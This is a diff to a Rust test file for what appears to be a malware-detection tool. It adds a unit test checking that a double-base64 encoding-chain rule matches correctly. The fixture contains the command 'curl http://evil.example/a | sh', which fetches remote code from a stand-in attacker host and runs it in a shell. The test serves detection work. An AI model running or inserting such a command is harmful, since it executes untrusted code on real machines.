@@ -1497,7 +1497,67 @@ fn create_test_report_with_multiple_encodings() -> AnalysisReport {
         fragments: None,
     });
 
+    // Stacked: the payload was wrapped twice, so the chain has two links.
+    report.strings.push(StringInfo {
+        value: ("curl http://evil.example/a | sh".to_string()).into(),
+        offset: Some(0x6000),
+        encoding: "utf8".to_string(),
+        string_type: None,
+        section: Some(".data".to_string()),
+        encoding_chain: vec!["base64".to_string(), "base64".to_string()],
+        fragments: None,
+    });
+
     report
+}
+
+/// `encoding: base64+base64` names a *chain*, not one encoding.
+///
+/// A doubly-wrapped payload is the signal — nothing legitimate encodes twice —
+/// and the chain spelling has to distinguish it from a payload that merely
+/// contains base64 somewhere, or the rule fires on every ordinary decode.
+#[test]
+fn test_eval_encoded_chain_spec_requires_consecutive_links() {
+    use crate::composite_rules::condition::EncodingSpec;
+
+    let report = create_test_report_with_multiple_encodings();
+    let data = vec![];
+    let ctx = create_test_context(&report, &data);
+    let location = ContentLocationParams::default();
+
+    let run = |spec: &str| {
+        let encoding = Some(EncodingSpec::Single(spec.to_string()));
+        eval_encoded(
+            encoding.as_ref(),
+            None,
+            Some(&"curl".to_string()),
+            None,
+            None,
+            false,
+            None,
+            &location,
+            false,
+            None,
+            &ctx,
+        )
+    };
+
+    assert!(
+        run("base64+base64").matched,
+        "base64+base64 must match the doubly-wrapped payload"
+    );
+    assert!(
+        run("base64").matched,
+        "a bare `base64` spec still matches a chain that contains base64"
+    );
+    assert!(
+        !run("hex+base64").matched,
+        "a chain that was never produced must not match"
+    );
+    assert!(
+        !run("base64+hex").matched,
+        "link order is part of the chain"
+    );
 }
 
 #[test]
